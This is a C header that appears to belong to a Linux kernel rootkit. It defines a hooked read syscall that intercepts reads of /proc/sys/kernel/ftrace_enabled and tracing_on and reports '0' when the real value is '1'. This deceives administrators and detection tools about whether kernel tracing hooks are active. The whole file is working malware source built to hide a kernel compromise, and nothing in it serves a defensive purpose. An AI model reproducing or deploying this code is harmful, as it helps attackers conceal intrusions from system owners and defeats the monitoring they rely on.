#ifndef READ_H
#define READ_H

#define B_F 4096  // Temporary buffer size for reading

static asmlinkage ssize_t (*og_read)(const struct pt_regs *regs); // Pointer to the original read function

static notrace asmlinkage ssize_t hooked_read(const struct pt_regs *regs) {
    int fd = regs->di; // First argument of read: fd
    char __user *user_buf = (char __user *)regs->si; // Second argument: output buffer for user
    char *kernel_buf;
    ssize_t bytes_read;
    struct file *file;

    static int spoof_next_read = 0; // Used to spoof one read

    // Check if the fd is from /proc/sys/kernel/ftrace_enabled or /proc/sys/kernel/tracing_on
    file = fget(fd); // Gets the file object corresponding to the fd
    if (file) {
        if (strcmp(file->f_path.dentry->d_name.name, "ftrace_enabled") == 0 ||
            strcmp(file->f_path.dentry->d_name.name, "tracing_on") == 0) {
            
            fput(file); // Free the file object after verification

            kernel_buf = kmalloc(B_F, GFP_KERNEL);
            if (!kernel_buf) {
                return -ENOMEM;
            }

            bytes_read = og_read(regs);
            if (bytes_read < 0) {
                kfree(kernel_buf);
                return bytes_read;
            }

            if (copy_from_user(kernel_buf, user_buf, bytes_read)) {
                kfree(kernel_buf);
                return -EFAULT;
            }

            // If the current val is "1" we need to spoof it, change it to "0" once. If not the zeros are so bad bro ...
            if (spoof_next_read == 0 && strncmp(kernel_buf, "1", 1) == 0) {
                kernel_buf[0] = '0';
                spoof_next_read = 1; // Ensure spoof happens only once
            } else {
                spoof_next_read = 0; // Reset spoof 
            }

            if (copy_to_user(user_buf, kernel_buf, bytes_read)) {
                kfree(kernel_buf);
                return -EFAULT;
            }

            kfree(kernel_buf);
            return bytes_read;
        }

        fput(file);
    }

    return og_read(regs);
}

#endif